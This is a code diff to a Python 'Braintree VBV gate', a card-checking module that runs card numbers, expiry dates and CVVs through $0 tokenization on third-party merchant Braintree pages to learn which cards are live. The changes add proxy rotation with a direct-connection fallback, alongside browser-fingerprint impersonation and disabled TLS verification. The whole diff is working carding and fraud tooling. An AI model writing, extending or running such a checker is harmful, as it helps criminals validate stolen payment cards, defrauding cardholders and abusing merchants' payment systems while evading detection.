@@ -2,7 +2,6 @@
 # Фаза 5: Braintree VBV lookup gate ($0 токенизация, вердикт по cvvResponseCode).
 import asyncio
 import os
-import sys
 from pathlib import Path
 
 import gate_client as gc
@@ -45,30 +44,41 @@ def _normalize(cc, mm, yy, cvv) -> str | None:
     return f"{cc}|{month:02d}|{year}|{str(cvv).strip()}"
 
 
-async def gate(cc, mm, yy, cvv) -> tuple[str, str]:
+async def gate(cc, mm, yy, cvv) -> tuple[str, str, dict]:
     masked = gc.mask_pan(cc)
     raw = _normalize(cc, mm, yy, cvv)
     if raw is None:
         log.log_warn(f"[braintreenvbv] invalid card format / Luhn failed for {masked}")
-        return ("INVALID", "bad card format / Luhn fail")
+        return ("INVALID", "bad card format / Luhn fail", {})
     targets = _targets()
     if not targets:
         log.log_error("braintreenvbv", "no braintree targets configured (env PUSTO_BT_TARGETS / data/braintree_targets.txt)")
-        return ("ERROR", "no braintree targets (env PUSTO_BT_TARGETS)")
+        return ("ERROR", "no braintree targets (env PUSTO_BT_TARGETS)", {})
+    proxy = gc.pick_proxy(gc.load_proxies(), None)
     async with _sem:
         for target in targets:
             log.log_target("braintreenvbv", target)
             log.log_gate("braintreenvbv", masked, "CHECKING", f"target={target}")
             try:
-                async with AsyncSession(impersonate=config.pick_impersonate(), verify=False) as s:
+                async with AsyncSession(impersonate=config.pick_impersonate(), verify=False, proxy=proxy) as s:
                     r = await s.get(target, timeout=10)
                     res = await gc.braintree_vbv_check(s, r.text, raw, target)
             except Exception as e:
-                log.log_warn(f"[braintreenvbv] target {target} failed: {type(e).__name__}: {e}")
-                res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:150]}
+                log.log_warn(f"[braintreenvbv] target {target} failed via proxy={proxy}: {type(e).__name__}: {e}")
+                # Fallback to direct if proxy failed with connection error
+                if proxy:
+                    try:
+                        async with AsyncSession(impersonate=config.pick_impersonate(), verify=False, proxy=None) as s:
+                            r = await s.get(target, timeout=10)
+                            res = await gc.braintree_vbv_check(s, r.text, raw, target)
+                            proxy = None
+                    except Exception as e2:
+                        res = {"status": "ERROR", "detail": f"{type(e2).__name__}: {e2}"[:150]}
+                else:
+                    res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:150]}
             if res["status"] != "ERROR":
                 log.log_gate("braintreenvbv", masked, res["status"], res["detail"][:80])
-                return (res["status"], res["detail"])
+                return (res["status"], res["detail"], {"proxy": proxy, "target": target})
         log.log_error("braintreenvbv", f"all {len(targets)} targets failed for {masked}")
-        return ("ERROR", f"all {len(targets)} targets failed")
+        return ("ERROR", f"all {len(targets)} targets failed", {"proxy": proxy})
 
